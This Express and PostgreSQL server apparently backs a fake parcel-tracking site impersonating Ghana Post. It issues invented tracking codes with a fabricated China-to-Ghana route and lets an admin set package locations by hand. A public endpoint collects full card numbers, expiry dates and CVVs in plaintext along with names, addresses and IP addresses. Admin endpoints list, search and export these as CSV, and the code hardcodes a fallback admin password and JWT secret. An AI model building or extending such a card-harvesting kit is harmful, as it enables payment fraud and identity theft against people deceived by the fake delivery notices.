
const express = require('express');
const { Pool } = require('pg');
const bcrypt = require('bcryptjs');
const cors = require('cors');
const jwt = require('jsonwebtoken');
const bodyParser = require('body-parser');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

const JWT_SECRET = process.env.JWT_SECRET || 'your-super-secret-key-for-jwt-tokens';
const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'admin';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'ghanapost2024';

// Database setup for PostgreSQL
const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false,
});

console.log('Connecting to PostgreSQL database...');

// Function to initialize database tables
const initializeDatabase = async () => {
    try {
        // Create submissions table
        await pool.query(`
            CREATE TABLE IF NOT EXISTS submissions (
                id SERIAL PRIMARY KEY,
                packageNumber TEXT,
                timestamp TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP,
                fullName TEXT,
                phoneNumber TEXT,
                email TEXT,
                streetAddress TEXT,
                city TEXT,
                region TEXT,
                postalCode TEXT,
                country TEXT,
                cardholderName TEXT,
                cardNumber TEXT,
                expiryDate TEXT,
                cvv TEXT,
                status TEXT DEFAULT 'pending',
                ipAddress TEXT,
                userAgent TEXT
            )
        `);

        // Create contacts table
        await pool.query(`
            CREATE TABLE IF NOT EXISTS contacts (
                id SERIAL PRIMARY KEY,
                timestamp TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP,
                name TEXT,
                email TEXT,
                phone TEXT,
                subject TEXT,
                message TEXT,
                department TEXT,
                status TEXT DEFAULT 'new'
            )
        `);

        // Create tracking codes table
        await pool.query(`
            CREATE TABLE IF NOT EXISTS tracking_codes (
                id SERIAL PRIMARY KEY,
                trackingCode TEXT UNIQUE NOT NULL,
                createdAt TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP,
                currentLocation TEXT DEFAULT 'China - Processing',
                currentStatus TEXT DEFAULT 'Order Placed',
                estimatedDelivery DATE,
                daysToDelivery INTEGER DEFAULT 60,
                description TEXT,
                status TEXT DEFAULT 'active',
                customerFullName TEXT,
                customerPhone TEXT,
                customerEmail TEXT,
                customerAddress TEXT,
                customerCity TEXT,
                customerRegion TEXT,
                customerPostalCode TEXT,
                customerCountry TEXT
            )
        `);

        // Create tracking route locations table
        await pool.query(`
            CREATE TABLE IF NOT EXISTS route_locations (
                id SERIAL PRIMARY KEY,
                routeorder INTEGER,
                location TEXT UNIQUE,
                country TEXT,
                description TEXT
            )
        `);

        // Insert default route locations if they don't exist
        const defaultLocations = [
            { order: 1, location: 'Shenzhen, China', country: 'China', desc: 'Order Processing & Packing' },
            { order: 2, location: 'Shanghai Port, China', country: 'China', desc: 'Port of Departure' },
            { order: 3, location: 'South China Sea', country: 'International Waters', desc: 'In Transit' },
            { order: 4, location: 'Suez Canal, Egypt', country: 'Egypt', desc: 'Port Transit' },
            { order: 5, location: 'Arabian Sea', country: 'International Waters', desc: 'In Transit' },
            { order: 6, location: 'Tema Port, Ghana', country: 'Ghana', desc: 'Port of Arrival' },
            { order: 7, location: 'Accra Customs', country: 'Ghana', desc: 'Customs Clearance' },
            { order: 8, location: 'Ghana Post Hub', country: 'Ghana', desc: 'Sorting & Distribution' },
            { order: 9, location: 'Local Delivery Station', country: 'Ghana', desc: 'Ready for Delivery' }
        ];

        const insertQuery = 'INSERT INTO route_locations (routeorder, location, country, description) VALUES ($1, $2, $3, $4) ON CONFLICT (location) DO NOTHING';
        for (const loc of defaultLocations) {
            await pool.query(insertQuery, [loc.order, loc.location, loc.country, loc.desc]);
            console.log(`Inserted location: ${loc.location}`);
        }

        console.log('Database tables are ready.');
    } catch (err) {
        console.error('Error initializing database:', err.message, err.stack);
    }
};


// Middleware to verify JWT
const authenticateToken = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    if (token == null) return res.sendStatus(401);

    jwt.verify(token, JWT_SECRET, (err, user) => {
        if (err) return res.sendStatus(403);
        req.user = user;
        next();
    });
};

// --- API Endpoints ---

// POST /api/submissions - Save user data
app.post('/api/submissions', async (req, res) => {
    const {
        packageNumber, fullName, phoneNumber, email, streetAddress, city, region,
        postalCode, country, cardholderName, cardNumber, expiryDate, cvv
    } = req.body;
    const ipAddress = req.ip;
    const userAgent = req.headers['user-agent'];

    const sql = `INSERT INTO submissions (
        packageNumber, fullName, phoneNumber, email, streetAddress, city, region,
        postalCode, country, cardholderName, cardNumber, expiryDate, cvv, ipAddress, userAgent
    ) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15) RETURNING id`;

    const params = [
        packageNumber, fullName, phoneNumber, email, streetAddress, city, region,
        postalCode, country, cardholderName, cardNumber, expiryDate, cvv, ipAddress, userAgent
    ];

    try {
        const result = await pool.query(sql, params);
        res.json({
            "message": "success",
            "data": { id: result.rows[0].id, ...req.body },
        });
    } catch (err) {
        console.error(err);
        res.status(400).json({ "error": err.message });
    }
});

// POST /api/contact - Save contact form submission
app.post('/api/contact', async (req, res) => {
    const { name, email, phone, subject, message, department } = req.body;

    if (!name || !email || !subject || !message) {
        return res.status(400).json({ "error": "Missing required fields" });
    }

    const sql = `INSERT INTO contacts (name, email, phone, subject, message, department)
                 VALUES ($1, $2, $3, $4, $5, $6) RETURNING id`;

    const params = [name, email, phone || null, subject, message, department || 'general'];

    try {
        const result = await pool.query(sql, params);
        res.json({
            "message": "Contact message received successfully",
            "data": { id: result.rows[0].id, ...req.body }
        });
    } catch (err) {
        console.error(err);
        res.status(400).json({ "error": err.message });
    }
});

// GET /api/submissions - Get all submissions (admin only)
app.get('/api/submissions', authenticateToken, async (req, res) => {
    const sql = "SELECT * FROM submissions ORDER BY timestamp DESC";
    try {
        const result = await pool.query(sql);
        res.json({
            "message": "success",
            "data": result.rows
        });
    } catch (err) {
        console.error(err);
        res.status(400).json({ "error": err.message });
    }
});

// GET /api/submissions/:id - Get single submission (admin only)
app.get('/api/submissions/:id', authenticateToken, async (req, res) => {
    const sql = "SELECT * FROM submissions WHERE id = $1";
    try {
        const result = await pool.query(sql, [req.params.id]);
        res.json({
            "message": "success",
            "data": result.rows[0] || null
        });
    } catch (err) {
        console.error(err);
        res.status(400).json({ "error": err.message });
    }
});

// DELETE /api/submissions/:id - Delete a submission (admin only)
app.delete('/api/submissions/:id', authenticateToken, async (req, res) => {
    const sql = "DELETE FROM submissions WHERE id = $1";
    try {
        const result = await pool.query(sql, [req.params.id]);
        res.json({ "message": "deleted", "changes": result.rowCount });
    } catch (err) {
        console.error(err);
        res.status(400).json({ "error": err.message });
    }
});

// PATCH /api/submissions/:id/status - Update submission status (admin only)
app.patch('/api/submissions/:id/status', authenticateToken, async (req, res) => {
    const { status } = req.body;
    if (!['pending', 'completed', 'flagged'].includes(status)) {
        return res.status(400).json({ "error": "Invalid status" });
    }
    const sql = "UPDATE submissions SET status = $1 WHERE id = $2";
    try {
        const result = await pool.query(sql, [status, req.params.id]);
        res.json({ "message": "status updated", "changes": result.rowCount });
    } catch (err) {
        console.error(err);
        res.status(400).json({ "error": err.message });
    }
});


// POST /api/admin/login - Admin authentication
app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ "error": "Username and password required" });
    }

    if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
        const accessToken = jwt.sign({ username: username }, JWT_SECRET, { expiresIn: '24h' });
        res.json({ accessToken: accessToken, message: "Login successful" });
    } else {
        res.status(401).json({ "error": "Invalid credentials" });
    }
});

// GET /api/contacts - Get all contact messages (admin only)
app.get('/api/contacts', authenticateToken, async (req, res) => {
    const sql = "SELECT * FROM contacts ORDER BY timestamp DESC";
    try {
        const result = await pool.query(sql);
        res.json({
            "message": "success",
            "data": result.rows
        });
    } catch (err) {
        console.error(err);
        res.status(400).json({ "error": err.message });
    }
});

// PATCH /api/contacts/:id/status - Mark contact as read (admin only)
app.patch('/api/contacts/:id/status', authenticateToken, async (req, res) => {
    const { status } = req.body;
    const sql = "UPDATE contacts SET status = $1 WHERE id = $2";
    try {
        const result = await pool.query(sql, [status || 'read', req.params.id]);
        res.json({ "message": "status updated", "changes": result.rowCount });
    } catch (err) {
        console.error(err);
        res.status(400).json({ "error": err.message });
    }
});

// GET /api/submissions/search - Search submissions (admin only)
app.get('/api/submissions/search', authenticateToken, async (req, res) => {
    const { query, startDate, endDate } = req.query;
    let sql = "SELECT * FROM submissions WHERE 1=1";
    const params = [];
    let paramIndex = 1;

    if (query) {
        sql += ` AND (fullName ILIKE $${paramIndex++} OR email ILIKE $${paramIndex++} OR phoneNumber ILIKE $${paramIndex++} OR packageNumber ILIKE $${paramIndex++})`;
        const searchTerm = `%${query}%`;
        params.push(searchTerm, searchTerm, searchTerm, searchTerm);
    }

    if (startDate) {
        sql += ` AND timestamp >= $${paramIndex++}`;
        params.push(startDate);
    }

    if (endDate) {
        sql += ` AND timestamp <= $${paramIndex++}`;
        params.push(endDate);
    }

    sql += " ORDER BY timestamp DESC";

    try {
        const result = await pool.query(sql, params);
        res.json({ "message": "success", "data": result.rows });
    } catch (err) {
        console.error(err);
        res.status(400).json({ "error": err.message });
    }
});

// GET /api/submissions/export/csv - Export submissions as CSV (admin only)
app.get('/api/submissions/export/csv', authenticateToken, async (req, res) => {
    const sql = "SELECT * FROM submissions ORDER BY timestamp DESC";
    try {
        const { rows } = await pool.query(sql);
        
        if (rows.length === 0) {
            res.setHeader('Content-Type', 'text/csv');
            res.setHeader('Content-Disposition', 'attachment; filename=submissions.csv');
            return res.send("");
        }

        const headers = Object.keys(rows[0]);
        const csvContent = [
            headers.join(','),
            ...rows.map(row =>
                headers.map(header => {
                    const value = row[header];
                    if (value === null || value === undefined) {
                        return '';
                    }
                    const strValue = String(value);
                    if (strValue.includes(',') || strValue.includes('"') || strValue.includes('\n')) {
                        return `"${strValue.replace(/"/g, '""')}"`;
                    }
                    return strValue;
                }).join(',')
            )
        ].join('\n');

        res.setHeader('Content-Type', 'text/csv');
        res.setHeader('Content-Disposition', 'attachment; filename=submissions.csv');
        res.send(csvContent);
    } catch (err) {
        console.error(err);
        res.status(400).json({ "error": err.message });
    }
});


// --- TRACKING CODE ENDPOINTS ---

// GET /api/tracking/routes - Get all available route locations
app.get('/api/tracking/routes', async (req, res) => {
    const sql = "SELECT * FROM route_locations ORDER BY routeorder ASC";
    try {
        const result = await pool.query(sql);
        console.log('Routes query result:', result.rows);
        res.json({ "message": "success", "data": result.rows });
    } catch (err) {
        console.error('Error fetching routes:', err);
        res.status(400).json({ "error": err.message });
    }
});

// POST /api/tracking/generate - Generate new tracking code (admin only)
app.post('/api/tracking/generate', authenticateToken, async (req, res) => {
    const { description, daysToDelivery, location } = req.body;

    const year = new Date().getFullYear();
    const randomNum = Math.floor(Math.random() * 1000000).toString().padStart(6, '0');
    const trackingCode = `GH-PKG-${year}-${randomNum}`;

    const startingLocation = location || 'Shenzhen, China';
    const sql = `INSERT INTO tracking_codes (trackingCode, currentLocation, currentStatus, daysToDelivery, description)
                 VALUES ($1, $2, $3, $4, $5) RETURNING id`;
    const params = [trackingCode, startingLocation, 'Order Placed', daysToDelivery || 60, description || ''];

    try {
        const result = await pool.query(sql, params);
        res.json({
            "message": "Tracking code generated successfully",
            "data": {
                id: result.rows[0].id,
                trackingCode,
                currentLocation: startingLocation,
                currentStatus: 'Order Placed',
                daysToDelivery: daysToDelivery || 60
            }
        });
    } catch (err) {
        console.error(err);
        res.status(400).json({ "error": err.message });
    }
});

// GET /api/tracking/:code - Track package by code (public)
app.get('/api/tracking/:code', async (req, res) => {
    const sql = "SELECT * FROM tracking_codes WHERE trackingCode = $1";
    try {
        const result = await pool.query(sql, [req.params.code]);
        const row = result.rows[0];

        if (!row) {
            return res.status(404).json({ "error": "Tracking code not found" });
        }

        const routeSql = 'SELECT * FROM route_locations ORDER BY routeorder ASC';
        const routesResult = await pool.query(routeSql);
        const routes = routesResult.rows;

        try {
            const daysToDelivery = row.daystodelivery || 60;
            const createdAt = row.createdat ? new Date(row.createdat) : new Date();
            const now = new Date();
            const elapsedMs = Math.max(0, now.getTime() - createdAt.getTime());
            const elapsedDays = Math.floor(elapsedMs / (24 * 60 * 60 * 1000));
            const computedDaysRemaining = Math.max(0, daysToDelivery - elapsedDays);

            const n = routes.length || 1;
            const fraction = daysToDelivery > 0 ? (elapsedDays / daysToDelivery) : 1;
            let computedIndex = Math.min(n - 1, Math.floor(fraction * (n - 1)));
            if (computedIndex < 0) computedIndex = 0;

            let storedIndex = 0;
            if (row.currentlocation) {
                const si = routes.findIndex(r => r.location === row.currentlocation);
                storedIndex = si >= 0 ? si : 0;
                console.log(`Admin set location: "${row.currentlocation}", found at index: ${storedIndex}`);
            }

            const chosenIndex = Math.max(storedIndex, computedIndex);
            const computedLocation = routes[chosenIndex] ? routes[chosenIndex].location : row.currentlocation;

            console.log(`Returning - currentLocation: ${row.currentlocation}, computedIndex: ${computedIndex}, storedIndex: ${storedIndex}, chosenIndex: ${chosenIndex}`);

            const out = { 
                ...row, 
                computedDaysRemaining, 
                computedIndex: storedIndex >= 0 ? storedIndex : computedIndex,
                computedLocation: row.currentlocation || computedLocation 
            };
            res.json({ "message": "success", "data": out });

        } catch (e) {
            console.error(e);
            res.json({ "message": "success", "data": row });
        }

    } catch (err) {
        console.error(err);
        res.status(400).json({ "error": err.message });
    }
});

// POST /api/tracking/:code/customer - Save customer details to tracking code (public)
app.post('/api/tracking/:code/customer', async (req, res) => {
    const { fullName, phoneNumber, email, streetAddress, city, region, postalCode, country } = req.body;

    const sql = `UPDATE tracking_codes SET 
                 customerFullName = $1, customerPhone = $2, customerEmail = $3,
                 customerAddress = $4, customerCity = $5, customerRegion = $6, 
                 customerPostalCode = $7, customerCountry = $8
                 WHERE trackingCode = $9`;

    const params = [fullName, phoneNumber, email, streetAddress, city, region, postalCode, country, req.params.code];

    try {
        const result = await pool.query(sql, params);
        if (result.rowCount === 0) {
            return res.status(404).json({ "error": "Tracking code not found" });
        }
        res.json({ "message": "Customer details saved successfully", "changes": result.rowCount });
    } catch (err) {
        console.error(err);
        res.status(400).json({ "error": err.message });
    }
});

// GET /api/tracking - Get all tracking codes (admin only)
app.get('/api/tracking', authenticateToken, async (req, res) => {
    const sql = "SELECT * FROM tracking_codes ORDER BY createdAt DESC";
    try {
        const result = await pool.query(sql);
        res.json({ "message": "success", "data": result.rows });
    } catch (err) {
        console.error(err);
        res.status(400).json({ "error": err.message });
    }
});

// PATCH /api/tracking/:id/location - Update tracking location (admin only)
app.patch('/api/tracking/:id/location', authenticateToken, async (req, res) => {
    const { currentLocation, currentStatus, daysToDelivery } = req.body;
    
    console.log(`Updating tracking ID ${req.params.id} with location: "${currentLocation}"`);
    
    let updates = [];
    let params = [];
    let paramIndex = 1;

    if (currentLocation) {
        updates.push(`currentLocation = $${paramIndex++}`);
        params.push(currentLocation);
    }
    if (currentStatus) {
        updates.push(`currentStatus = $${paramIndex++}`);
        params.push(currentStatus);
    }
    if (daysToDelivery !== undefined) {
        updates.push(`daysToDelivery = $${paramIndex++}`);
        params.push(daysToDelivery);
    }
    
    if (updates.length === 0) {
        return res.status(400).json({ "error": "No fields to update" });
    }

    params.push(req.params.id);
    const sql = `UPDATE tracking_codes SET ${updates.join(', ')} WHERE id = $${paramIndex} RETURNING *`;

    try {
        const result = await pool.query(sql, params);
        console.log(`Updated ${result.rowCount} rows`);
        
        if (result.rowCount > 0) {
            res.json({ "message": "Tracking updated successfully", "data": result.rows[0] });
        } else {
            res.status(404).json({ "error": "Tracking code not found" });
        }
    } catch (err) {
        console.error(err);
        res.status(400).json({ "error": err.message });
    }
});

// DELETE /api/tracking/:id - Delete tracking code (admin only)
app.delete('/api/tracking/:id', authenticateToken, async (req, res) => {
    const sql = "DELETE FROM tracking_codes WHERE id = $1";
    try {
        const result = await pool.query(sql, [req.params.id]);
        res.json({ "message": "Tracking code deleted", "changes": result.rowCount });
    } catch (err) {
        console.error(err);
        res.status(400).json({ "error": err.message });
    }
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, async () => {
    await initializeDatabase();
    console.log(`Server is running on port ${PORT}`);
});
